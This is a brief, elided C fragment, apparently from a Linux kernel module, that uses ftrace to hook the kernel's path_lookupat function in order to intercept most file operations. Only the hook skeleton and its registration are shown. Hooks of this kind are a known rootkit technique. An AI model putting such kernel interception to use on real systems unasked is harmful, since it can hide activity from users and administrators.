...
static int (*orig_path_lookupat)(struct nameidata *nd, unsigned flags, struct path *path);
...
/**
 * Hook that catches most file related operations
 */
notrace static int hook_path_lookupat(struct nameidata *nd, unsigned flags, struct path *path)
{
    int err;
    unsigned long ino;

    err = orig_path_lookupat(nd, flags, path);
...
static struct ftrace_hook hooks[] = {
    ...
    HOOK("path_lookupat.isra.0", hook_path_lookupat, &orig_path_lookupat),
